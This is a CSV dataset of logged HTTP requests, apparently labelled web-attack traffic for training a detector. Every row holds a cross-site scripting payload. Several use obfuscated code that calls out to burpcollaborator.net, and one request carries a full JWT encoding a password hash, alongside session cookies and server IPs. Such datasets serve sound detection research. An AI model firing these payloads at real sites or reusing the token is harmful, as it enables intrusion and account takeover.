id,method,user_agent,url,refer,body,lable
2884,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexisto_index=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3455,GET,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F","/pan/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1""%20onmouseover=alert(document.domain)//",,,5
2860,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print,,,5
1772,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/forum/forum/include/error/autherror.cfm?errorcode=1&FTVAR_LINKP=%22%3e%3c%2fa%3e%3cscript%3ealert('fusetalk_mult_xss.nasl')%3c%2fscript%3e%3ca%20href%3d%22,,,5
507,GET,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",/src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,"GET /src/help.php?chapter=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1 Host: 116.211.155.193:7983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",5
1727,GET,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",/pan/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E,,,5
3449,GET,"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",/pan/log?type=%22%3C/script%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3Cscript%3E,,,5
4772,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html,,,5
168,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/robots.txt?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fumkc0ease1kctz6lup0y81fppgvaj07sygs3ir7X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,,"GET /robots.txt?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fumkc0ease1kctz6lup0y81fppgvaj07sygs3ir7X%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0  ",5
3792,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/vothqsno.php3?<script>cross_site_scripting.nasl</script>,,,5
70,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/w1y608i88x4ceubeobddkq40srylmkac10ssfi37X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/quarantine/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/w1y608i88x4ceubeobddkq40srylmkac10ssfi37X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
1525,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/manager/wk70ls4m.aspx?<script>document.cookie=%22testqbli=447;%22</script>,,,5
1117,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/uvRGF/uvRGF/uvRGF/uvRGF/get?articleId=%3C%2FboDy%3E%3CImG+id%3D%27obSodHSL%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbodY%3E&organId=%3C%2FbodY%3E%3CIMg+id%3D%27VgTuHOHg%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdY%3E&siteId=%3C%2FbOdy%3E%3CImG+id%3D%27RVDkJvmQ%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbODy%3E,https://hq.bda.edu.cn/,,5
1784,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/2m9wwi9l.dll?<script>cross_site_scripting.nasl</script>,,,5
145,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/export.asp?SQL=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3Eselect+%5Bword_id%5D%2C+%5Bword_id%5D%2C+++%5Btr%5D%2C+++%5Ben%5D%2C+++%5Bdesc%5D++From+%5Bdictionary%5D++order+by+%5Ben%5D+desc&mypage=1&pagesize=20,,,5
487,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/legal.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f020kiex6cmmuwa3dn8y9vnr9a0gu4osgj4dr3fsX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp/,"GET /ftp/legal.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f020kiex6cmmuwa3dn8y9vnr9a0gu4osgj4dr3fsX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
1798,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),"/extman/cgi/forgetpwd.cgi?__mode=step2&username=504%20onerror=""alert(504);",,,5
4250,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
4682,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-admin/admin.php?page=contact-form-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3579,GET,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",/pan/ie50/system/login/SysLoginUser.aspx?Login=Denied&UID=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3790,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/<script>cross_site_scripting.nasl</script>.aspx,,,5
741,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/zcfg/zcfg.asp?PageNo=1<script>Y8u5(9465)</script>,http://114.251.10.167/,"GET /zcfg/zcfg.asp?PageNo=1<script>Y8u5(9465)</script> HTTP/1.1 Referer: http://114.251.10.167/ Cookie: ASPSESSIONIDSCDSDRDS=DHAFENDBHMIPDKGDLCNHIJAB Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.167 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
1105,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/create?c=prMmi%3CprMmi%3EprMmi%27prMmi%22prMmi%2FprMmi-prMmi&i=0&t=xxxx&u=%3C%2FBODY%3E%3CimG+id%3D%27ZSfRtBMU%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDY%3E,https://api.bmac.com.cn:9092/,,5
168,GET,python-requests/2.18.4,/blog/wp-content/themes/wp-blog/?%22onmouseover='prompt(42873)'bad=%22%3E,,,5
3508,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/c0zrmfzc.aspx?<script>cross_site_scripting.nasl</script>,,,5
39,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/qhbax4cwrc1kb0i32ydzad6zpqvjjady5ptgl3br0X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/qhbax4cwrc1kb0i32ydzad6zpqvjjady5ptgl3br0X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
2809,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/index.jsp?operatorlocale=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E,,,5
2889,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/pages/ajax.render.php?operation=render_dashboard&dashboard_id=1&layout_class=DashboardLayoutOneCol&title=%%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
1779,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/cgi-bin/60teglc6.mscgi?<script>document.cookie=%22testlqex=3433;%22</script>,,,5
236,GET,python-requests/2.18.4,/Activity/edit?end_time=2016-12-31+00%3A00%3A00&image=88888&url=http://www.hacker.org/&is_popup=0&sequence=0&detail=%3Cp%3E%E6%A0%B9%E6%8D%AE%E4%BA%A7%E5%93%81%E9%9C%80%E6%B1%82%EF%BC%8C%E2%80%9C%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%E7%94%B3%E8%AF%B7%E2%80%9D%E7%9A%84%E9%9C%80%E6%B1%82%E6%9C%89%E4%B8%AA%E5%B0%8F%E8%B0%83%E6%95%B4%EF%BC%9A%3C%2Fp%3E%3Cp%3E1.+%E7%94%B3%E8%AF%B7%E6%B5%81%E7%A8%8B%E8%B0%83%E6%95%B4%EF%BC%9A%E4%B9%8B%E5%89%8D%E5%85%88%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%E5%86%8D%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%EF%BC%8C%E6%94%B9%E4%B8%BA%E5%85%88%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%E5%86%8D%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%EF%BC%882%E4%B8%AA%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92%E4%B8%8B%EF%BC%89%E3%80%82%3C%2Fp%3E%3Cp%3E2.+%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%94%A8%E6%88%B7%E6%AF%8F%E5%AE%8C%E6%88%901%E4%B8%AA%E7%94%B3%E8%25&id=1&start_time=2016-07-05+00%3A00%3A00%3Cscript%3Ealert(42873)%3C/script%3E,,,5
429,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/a3eshur8vh1safn1b5hephw56wcp0g04svgs3ir7X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/products/search?q=,http://121.4.111.58:3000/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/a3eshur8vh1safn1b5hephw56wcp0g04svgs3ir7X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/products/search?q= HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieco",5
4224,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/parsi-font/css.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
779,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/static/jquery-validation/""-->1<ScRiPt>V6zu(9092)</ScRiPt><!--",http://114.251.10.80/,"GET /static/jquery-validation/""-->1<ScRiPt>V6zu(9092)</ScRiPt><!-- HTTP/1.1 Referer: http://114.251.10.80/ Cookie: JSESSIONID=2956A011E5AFB1FA7B33D6DE630C3642;eiaweb.session.id=9d04a2977ad64085bc5c06d09c402de4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.80 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
3932,POST,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",/pan/wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload,,"-----------------------------77916619616724262872902741074 Content-Disposition: form-data; name=""upload""; filename=""2BdZb2NASybaiknRm8UclQGhVnX.txt"" Content-Type: text/plain Test -----------------------------77916619616724262872902741074-- ",5
350,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/nne517blful5us7evi1r9ugiq9w3ku8mzawxnlcX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_windows_64.exe.url,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/nne517blful5us7evi1r9ugiq9w3ku8mzawxnlcX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_windows_64.exe.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
